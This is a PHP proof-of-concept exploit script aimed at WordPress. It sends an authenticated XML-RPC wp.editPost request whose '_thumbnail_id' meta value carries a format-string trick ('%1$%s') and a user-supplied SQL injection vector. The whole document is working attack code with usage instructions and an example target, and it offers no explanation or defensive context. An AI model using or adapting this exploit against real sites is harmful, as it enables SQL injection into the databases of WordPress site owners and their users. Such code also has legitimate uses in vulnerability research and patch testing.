<?php
// Load IXR_Library from http://www.hurricanesoftwares.com/php_uploads/IXR_Library.txt for execute XML-RPC requests
require_once( 'IXR_Library.txt' );
if(count($argv) < 7) {
	print("Please set all parameters for use exploit".PHP_EOL);
	print("{$argv[0]} <url> <login> <password> <post_id> <attach_id> <sqli_vector>".PHP_EOL);
	print("Example: {$argv[0]} http://wp.visualhack/xmlrpc.php author qazwsxedc 5 6 ".PHP_EOL);
	die(1);
}
$xmlrpc_url = $argv[1]; // url of wordpress
$usr = $argv[2]; // login
$pwd = $argv[3]; // password
$client = new IXR_Client($xmlrpc_url);
$post_id = $argv[4]; // created post id
$media_id = $argv[5]; // created media id
$payload = $argv[6]; // sql injection part
$content = array("ID" => $post_id, 'meta_input' => array("_thumbnail_id"=>"$media_id %1$%s $payload"));
$res = $client->query('wp.editPost', 0, $usr, $pwd, $post_id, $content);
var_dump($res);